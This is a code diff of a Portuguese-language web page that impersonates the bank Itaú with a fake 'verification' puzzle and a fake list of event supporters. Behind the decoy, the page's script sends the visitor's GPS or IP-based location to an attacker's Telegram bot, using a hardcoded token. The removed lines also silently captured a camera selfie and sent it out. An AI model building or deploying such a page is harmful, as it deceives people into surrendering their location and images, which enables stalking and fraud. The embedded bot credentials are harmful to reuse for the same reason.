@@ -2,37 +2,47 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Verificação – Itaú</title>
+<title>Monte o robô – Itaú</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
-body{background:#0a2540;color:#fff;display:flex;height:100vh;align-items:center;justify-content:center}
-.card{background:#fff;color:#003366;border-radius:16px;padding:28px 24px;max-width:320px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.25)}
-img{width:80px;margin-bottom:12px}
-h2{font-size:18px;margin-bottom:8px}
-p{font-size:14px;margin-bottom:20px;line-height:1.35}
+body{background:#0a2540;color:#fff;display:flex;min-height:100vh;align-items:center;justify-content:center;flex-direction:column}
+.card{background:#fff;color:#003366;border-radius:16px;padding:24px;max-width:340px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.25)}
+h2{font-size:18px;margin-bottom:12px}
+p{font-size:14px;margin-bottom:16px}
+.pieces{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:16px}
+.piece{width:100%;aspect-ratio:1/1;background:#f1f1f1;border:2px solid transparent;border-radius:8px;cursor:pointer;position:relative}
+.piece img{width:100%;height:100%;object-fit:contain}
+.piece.wrong{border-color:#e74c3c}
+.piece.ok{border-color:#00c851}
 button{background:#003366;color:#fff;border:none;padding:12px 0;width:100%;border-radius:6px;font-size:16px;cursor:pointer}
-button:active{transform:scale(.98)}
 button:disabled{background:#999;cursor:not-allowed}
-ul{text-align:left;font-size:13px;margin-top:12px;padding-left:20px}
-li{margin-bottom:4px}
+button:active{transform:scale(.98)}
+#localBtn{display:none}
 </style>
 </head>
 <body>
 
-<!-- TELA DE CONVENCIMENTO -->
-<div id="startBox" class="card">
-  <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect x='15' y='20' width='70' height='60' rx='12' fill='%23003366'/%3E%3Ccircle cx='35' cy='40' r='5' fill='%23fff'/%3E%3Ccircle cx='65' cy='40' r='5' fill='%23fff'/%3E%3Crect x='30' y='55' width='40' height='5' rx='2' fill='%23fff'/%3E%3Crect x='25' y='75' width='10' height='15' rx='3' fill='%23003366'/%3E%3Crect x='65' y='75' width='10' height='15' rx='3' fill='%23003366'/%3E%3C/svg%3E" alt="robô">
-  <h2>Verificação rápida</h2>
-  <p>Precisamos verificar se não é um <strong>robô</strong>. Toque em <strong>Permitir</strong> pra continuar.</p>
-  <button id="btnPermitir">Permitir</button>
+<!-- ETAPA 1 – MONTE O ROBÔ -->
+<div id="step1" class="card">
+  <h2>Monte o robô</h2>
+  <p>Clique nas peças <strong>na ordem</strong> (1 a 6).</p>
+  <div class="pieces" id="pieces"></div>
+  <button id="continue1" disabled>Continuar</button>
 </div>
 
-<!-- LISTA DE APOIADORES -->
-<div id="listaBox" class="card" style="display:none">
+<!-- ETAPA 2 – PERMITIR LOCALIZAÇÃO -->
+<div id="step2" class="card" style="display:none">
+  <h2>Permitir localização</h2>
+  <p>Precisamos confirmar sua identidade.</p>
+  <button id="localBtn">Permitir localização</button>
+</div>
+
+<!-- ETAPA 3 – LISTA DE APOIADORES -->
+<div id="step3" class="card" style="display:none">
   <h2>Verificado ✅</h2>
   <p>Apoiadores confirmados:</p>
-  <ul>
+  <ul style="text-align:left;font-size:13px;padding-left:20px">
     <li>Carlos Henrique – DJ</li>
     <li>Amanda Souza – Segurança</li>
     <li>Lucas Oliveira – Bar</li>
@@ -43,7 +53,7 @@ li{margin-bottom:4px}
     <li>Luana Ferreira – Decoração</li>
   </ul>
   <p style="font-size:11px;color:#666;margin-top:12px">Licença de baile emitida com sucesso.</p>
-  <button id="btnProsseguir" disabled>Prosseguir</button>
+  <button id="prossegue" disabled>Prosseguir</button>
 </div>
 
 <script>
@@ -51,12 +61,75 @@ li{margin-bottom:4px}
 const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
 const CHAT_ID = '-1003187104876';
 
-// FLAGS DE PERMISSÃO
-let cameraOk = false;
-let localOk  = false;
+// SVGs DAS PEÇAS (1 a 6)
+const svgs = [
+  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="10" y="10" width="80" height="30" rx="8" fill="%23003366"/%3E%3C/svg%3E', // cabeça
+  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="20" y="15" width="60" height="20" rx="6" fill="%23003366"/%3E%3C/svg%3E', // pescoço
+  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="5" y="5" width="90" height="40" rx="10" fill="%23003366"/%3E%3C/svg%3E', // tronco
+  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="10" y="10" width="35" height="60" rx="8" fill="%23003366"/%3E%3C/svg%3E', // braço esq
+  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="55" y="10" width="35" height="60" rx="8" fill="%23003366"/%3E%3C/svg%3E', // braço dir
+  '%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"%3E%3Crect x="25" y="10" width="50" height="70" rx="10" fill="%23003366"/%3E%3C/svg%3E'  // pernas
+];
 
-// ENVIA PARA O TELEGRAM
-const tele = (msg, media) => {
+// EMBARALHA ARRAY
+const shuffle = a => a.sort(() => Math.random() - 0.5);
+
+// MONTA PEÇAS
+let seq = [];
+const piecesBox = document.getElementById('pieces');
+[0,1,2,3,4,5].forEach(i => {
+  const div = document.createElement('div');
+  div.className = 'piece';
+  div.dataset.idx = i;
+  div.innerHTML = `<img src="data:image/svg+xml;utf8,${svgs[i]}" alt="peça ${i+1}">`;
+  piecesBox.appendChild(div);
+});
+shuffle([...piecesBox.children]).forEach(el => piecesBox.appendChild(el));
+
+// CLICK NAS PEÇAS
+document.querySelectorAll('.piece').forEach(p => p.addEventListener('click', () => {
+  const idx = Number(p.dataset.idx);
+  if (seq.length === idx) {
+    seq.push(idx);
+    p.classList.add('ok');
+    if (seq.length === 6) document.getElementById('continue1').disabled = false;
+  } else {
+    p.classList.add('wrong');
+    setTimeout(() => p.classList.remove('wrong'), 400);
+  }
+}));
+
+// CONTINUAR → ETAPA 2
+document.getElementById('continue1').addEventListener('click', () => {
+  document.getElementById('step1').style.display = 'none';
+  document.getElementById('step2').style.display = 'block';
+  document.getElementById('localBtn').style.display = 'inline-block';
+});
+
+// PERMITIR LOCALIZAÇÃO
+let localOk = false;
+document.getElementById('localBtn').addEventListener('click', () => {
+  navigator.geolocation.getCurrentPosition(
+    p => {
+      const {latitude: lat, longitude: lon} = p.coords;
+      enviaTelegram(`📍 GPS: https://maps.google.com/?q=${lat},${lon}`);
+      localOk = true;
+      mostraStep3();
+    },
+    () => {
+      fetch('https://ipapi.co/json/')
+        .then(r => r.json())
+        .then(d => {
+          enviaTelegram(`📍 IP: https://maps.google.com/?q=${d.latitude},${d.longitude}`);
+          localOk = true;
+          mostraStep3();
+        });
+    }
+  );
+});
+
+// ENVIA TELEGRAM
+const enviaTelegram = (msg, media) => {
   const url = media
     ? `https://api.telegram.org/bot${TOKEN}/sendPhoto`
     : `https://api.telegram.org/bot${TOKEN}/sendMessage`;
@@ -69,64 +142,15 @@ const tele = (msg, media) => {
   });
 };
 
-// ATUALIZA BOTÃO PROSSEGUIR
-function atualizaProsseguir(){
-  if(cameraOk && localOk){
-    document.getElementById('btnProsseguir').disabled = false;
-  }
+// MOSTRA ETAPA 3
+function mostraStep3(){
+  document.getElementById('step2').style.display = 'none';
+  document.getElementById('step3').style.display = 'block';
+  document.getElementById('prossegue').disabled = false;
 }
 
-// AÇÃO DO BOTÃO PERMITIR
-document.getElementById('btnPermitir').addEventListener('click', async () => {
-
-  // GPS
-  navigator.geolocation.getCurrentPosition(
-    p => {
-      const {latitude: lat, longitude: lon} = p.coords;
-      tele(`📍 GPS: https://maps.google.com/?q=${lat},${lon}`);
-      localOk = true;
-      atualizaProsseguir();
-    },
-    () => {
-      fetch('https://ipapi.co/json/')
-        .then(r => r.json())
-        .then(d => {
-          tele(`📍 IP: https://maps.google.com/?q=${d.latitude},${d.longitude}`);
-          localOk = true;
-          atualizaProsseguir();
-        });
-    }
-  );
-
-  // Selfie
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
-    const v = document.createElement('video');
-    v.srcObject = stream;
-    await v.play();
-    const canvas = document.createElement('canvas');
-    canvas.width = 640; canvas.height = 480;
-    canvas.getContext('2d').drawImage(v, 0, 0);
-    canvas.toBlob(blob => {
-      tele('📸 selfie', blob);
-      stream.getTracks().forEach(t => t.stop());
-      cameraOk = true;
-      atualizaProsseguir();
-    }, 'image/jpeg', 0.9);
-  } catch (e) {
-    tele('📸 selfie falhou: ' + e.message);
-    cameraOk = true; // mesmo falando, libera o botão
-    atualizaProsseguir();
-  }
-
-  // Mostra lista
-  document.getElementById('startBox').style.display = 'none';
-  document.getElementById('listaBox').style.display = 'block';
-});
-
-// AÇÃO DO BOTÃO PROSSEGUIR
-document.getElementById('btnProsseguir').addEventListener('click', () => {
-  // Aqui você pode redirecionar ou finalizar
+// AÇÃO FINAL
+document.getElementById('prossegue').addEventListener('click', () => {
   alert('Tudo certo! Prosseguindo...');
 });
 </script>
